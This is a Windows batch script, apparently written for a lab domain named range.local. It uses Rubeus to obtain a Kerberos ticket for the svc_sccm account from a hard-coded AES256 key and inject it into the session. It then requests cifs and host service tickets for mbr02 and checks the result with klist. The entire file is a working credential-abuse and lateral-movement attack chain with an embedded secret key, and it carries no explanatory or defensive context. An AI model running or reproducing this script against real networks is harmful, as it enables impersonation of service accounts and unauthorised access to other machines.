@echo off
chcp 437 >nul
cd /d C:\Tools\ADTools
Rubeus.exe asktgt /user:svc_sccm /domain:range.local /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /ptt >nul 2>&1
echo === ASKTGS cifs/mbr02.range.local ===
Rubeus.exe asktgs /service:cifs/mbr02.range.local /ptt 2>&1 | findstr /i "TGS request KRB-ERROR error received"
echo === ASKTGS host/mbr02.range.local ===
Rubeus.exe asktgs /service:host/mbr02.range.local /ptt 2>&1 | findstr /i "TGS request KRB-ERROR error received"
echo === KLIST after TGS ===
klist
